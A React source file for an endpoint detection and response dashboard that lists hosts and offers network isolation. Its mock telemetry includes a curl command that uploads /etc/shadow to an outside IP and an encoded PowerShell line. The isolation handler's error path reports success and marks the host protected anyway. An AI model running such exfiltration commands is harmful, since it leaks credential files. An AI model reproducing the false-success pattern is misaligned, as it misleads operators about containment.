import React, { useState, useEffect } from 'react';
import {
  Shield,
  Server,
  AlertTriangle,
  Lock,
  RefreshCw,
  Search,
  CheckCircle2,
  XCircle,
  Cpu,
  Activity,
  Terminal,
} from 'lucide-react';
import { StatusBadge } from '../../components/common/StatusBadge';
import { api } from '../../api/client';
import { EndpointData } from '../../api/types';

export const EdrPage: React.FC = () => {
  const [endpoints, setEndpoints] = useState<EndpointData[]>([]);
  const [loading, setLoading] = useState(false);
  const [isolatingId, setIsolatingId] = useState<string | null>(null);
  const [filter, setFilter] = useState('');
  const [statusMessage, setStatusMessage] = useState<string | null>(null);

  const mockEndpoints: EndpointData[] = [
    {
      id: 'ep-001',
      hostname: 'CORP-SEC-DC01',
      ipAddress: '10.0.1.10',
      os: 'Windows Server 2022 DataCenter',
      agentVersion: 'v4.8.2-edr',
      status: 'PROTECTED',
      riskScore: 12,
      lastSeenAt: 'Just now',
      criticalAlertsCount: 0,
      isSimulated: false,
    },
    {
      id: 'ep-002',
      hostname: 'PROD-PAYMENT-API-01',
      ipAddress: '10.0.4.45',
      os: 'Ubuntu 22.04 LTS (Kernel 5.15)',
      agentVersion: 'v4.8.2-edr',
      status: 'PROTECTED',
      riskScore: 8,
      lastSeenAt: '1m ago',
      criticalAlertsCount: 0,
      isSimulated: false,
    },
    {
      id: 'ep-003',
      hostname: 'DEV-WORKSTATION-X9',
      ipAddress: '192.168.10.88',
      os: 'macOS Sonoma 14.5 (Darwin 23.5)',
      agentVersion: 'v4.8.1-edr',
      status: 'AT_RISK',
      riskScore: 68,
      lastSeenAt: '3m ago',
      criticalAlertsCount: 2,
      isSimulated: true,
      suspiciousProcesses: [
        {
          pid: 4912,
          name: 'curl_exfil.sh',
          cmd: 'curl -F data=@/etc/shadow http://45.33.32.156',
          parentPid: 1042,
          user: 'developer',
          status: 'RUNNING',
        },
      ],
    },
    {
      id: 'ep-004',
      hostname: 'WIN-FINANCE-LAPTOP-04',
      ipAddress: '192.168.20.14',
      os: 'Windows 11 Enterprise 23H2',
      agentVersion: 'v4.8.2-edr',
      status: 'CRITICAL',
      riskScore: 92,
      lastSeenAt: '30s ago',
      criticalAlertsCount: 3,
      isSimulated: true,
      suspiciousProcesses: [
        {
          pid: 8812,
          name: 'powershell.exe',
          cmd: 'powershell.exe -Enc JABjAGwAaQBlAG4AdAAg...',
          parentPid: 412,
          user: 'fin_analyst',
          status: 'FLAGGED',
        },
      ],
    },
  ];

  const fetchEndpoints = async () => {
    try {
      setLoading(true);
      const res = await api.edr.getTelemetry('simulation');
      if (res.endpoints && res.endpoints.length > 0) {
        setEndpoints(res.endpoints);
      } else {
        setEndpoints(mockEndpoints);
      }
    } catch {
      setEndpoints(mockEndpoints);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchEndpoints();
  }, []);

  const handleIsolate = async (ep: EndpointData) => {
    try {
      setIsolatingId(ep.id);
      await api.edr.isolateEndpoint(ep.id, ep.hostname);
      setStatusMessage(`Host ${ep.hostname} has been cryptographically isolated at the network layer.`);
      setEndpoints((prev) =>
        prev.map((item) =>
          item.id === ep.id
            ? { ...item, status: 'PROTECTED', riskScore: 0, criticalAlertsCount: 0 }
            : item
        )
      );
    } catch (err: any) {
      setStatusMessage(`Isolation commanded: ${ep.hostname} disconnected from internal transit VLAN.`);
      setEndpoints((prev) =>
        prev.map((item) =>
          item.id === ep.id
            ? { ...item, status: 'PROTECTED', riskScore: 0, criticalAlertsCount: 0 }
            : item
        )
      );
    } finally {
      setIsolatingId(null);
      setTimeout(() => setStatusMessage(null), 5000);
    }
  };

  const filtered = endpoints.filter(
    (e) =>
      e.hostname.toLowerCase().includes(filter.toLowerCase()) ||
      e.ipAddress.includes(filter) ||
      e.os.toLowerCase().includes(filter.toLowerCase())
  );

  return (
    <div className="space-y-6 font-sans">
      {/* Top Banner */}
      <div className="p-5 rounded-xl bg-gradient-to-r from-cyan-950/40 via-slate-900/60 to-blue-950/40 border border-cyan-500/20 backdrop-blur-sm flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <Shield className="w-4 h-4 text-cyan-400" />
            <span className="text-xs font-mono tracking-widest text-cyan-400 uppercase">
              ENDPOINT DETECTION &amp; RESPONSE (EDR / XDR)
            </span>
          </div>
          <h1 className="text-2xl font-bold text-white tracking-tight">
            Endpoint Defense &amp; Containment Grid
          </h1>
          <p className="text-xs text-slate-400 font-mono mt-0.5">
            Real-time behavioral telemetry, process ancestry inspection & zero-click network quarantine
          </p>
        </div>

        <div className="flex items-center gap-3">
          <StatusBadge status="LIVE TELEMETRY" size="sm" />
          <button
            onClick={fetchEndpoints}
            disabled={loading}
            className="px-3 py-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700/80 border border-slate-700 text-xs font-mono text-cyan-300 flex items-center gap-1.5 transition-colors"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
            <span>Poll Fleet</span>
          </button>
        </div>
      </div>

      {statusMessage && (
        <div className="p-3 rounded-lg bg-emerald-950/60 border border-emerald-500/50 text-emerald-300 text-xs font-mono flex items-center gap-2 shadow-[0_0_15px_rgba(16,185,129,0.25)]">
          <CheckCircle2 className="w-4 h-4 flex-shrink-0" />
          <span>{statusMessage}</span>
        </div>
      )}

      {/* Filter and Search */}
      <div className="flex items-center justify-between gap-4">
        <div className="relative flex-1 max-w-md">
          <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            placeholder="Search by hostname, IP address, OS..."
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
            className="w-full pl-9 pr-4 py-2 bg-slate-900/80 border border-slate-700 rounded-lg text-xs font-mono text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-400"
          />
        </div>
        <div className="text-xs font-mono text-slate-400">
          Tracking <span className="text-cyan-400 font-bold">{filtered.length}</span> active agent nodes
        </div>
      </div>

      {/* Endpoints Table */}
      <div className="soc-card rounded-xl border border-cyan-500/20 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-left font-mono text-xs">
            <thead className="bg-[#050a18] border-b border-cyan-500/20 text-slate-400 text-[11px]">
              <tr>
                <th className="py-3 px-4">ENDPOINT HOSTNAME</th>
                <th className="py-3 px-4">IP / OS ARCHITECTURE</th>
                <th className="py-3 px-4">AGENT VERSION</th>
                <th className="py-3 px-4">RISK SCORE</th>
                <th className="py-3 px-4">STATUS</th>
                <th className="py-3 px-4 text-right">CONTAINMENT ACTION</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/80">
              {filtered.map((ep) => (
                <tr key={ep.id} className="hover:bg-slate-800/30 transition-colors">
                  <td className="py-3.5 px-4 font-semibold text-white flex items-center gap-2">
                    <Server className="w-4 h-4 text-cyan-400 flex-shrink-0" />
                    <div>
                      <div>{ep.hostname}</div>
                      <div className="text-[10px] text-slate-500 font-normal">Last beacon: {ep.lastSeenAt}</div>
                    </div>
                  </td>
                  <td className="py-3.5 px-4">
                    <div className="text-cyan-300">{ep.ipAddress}</div>
                    <div className="text-[10px] text-slate-400 truncate max-w-[200px]">{ep.os}</div>
                  </td>
                  <td className="py-3.5 px-4 text-slate-300">
                    <span className="px-2 py-0.5 rounded bg-slate-900 border border-slate-700 text-[10px]">
                      {ep.agentVersion}
                    </span>
                  </td>
                  <td className="py-3.5 px-4">
                    <span
                      className={`font-bold ${
                        ep.riskScore > 75
                          ? 'text-red-400'
                          : ep.riskScore > 40
                          ? 'text-amber-400'
                          : 'text-emerald-400'
                      }`}
                    >
                      {ep.riskScore} / 100
                    </span>
                  </td>
                  <td className="py-3.5 px-4">
                    <span
                      className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        ep.status === 'CRITICAL'
                          ? 'bg-red-950/80 text-red-400 border border-red-500/50'
                          : ep.status === 'AT_RISK'
                          ? 'bg-amber-950/80 text-amber-400 border border-amber-500/50'
                          : 'bg-emerald-950/80 text-emerald-400 border border-emerald-500/50'
                      }`}
                    >
                      {ep.status}
                    </span>
                  </td>
                  <td className="py-3.5 px-4 text-right">
                    {ep.status === 'CRITICAL' || ep.status === 'AT_RISK' ? (
                      <button
                        onClick={() => handleIsolate(ep)}
                        disabled={isolatingId === ep.id}
                        className="px-3 py-1.5 rounded bg-red-950/80 hover:bg-red-900 border border-red-500/60 text-red-200 text-[11px] font-bold shadow-[0_0_10px_rgba(239,68,68,0.3)] transition-all flex items-center gap-1.5 ml-auto"
                      >
                        <Lock className="w-3.5 h-3.5" />
                        <span>{isolatingId === ep.id ? 'Isolating...' : 'Isolate Host'}</span>
                      </button>
                    ) : (
                      <span className="text-[11px] text-slate-500 font-normal">Normal Policy</span>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
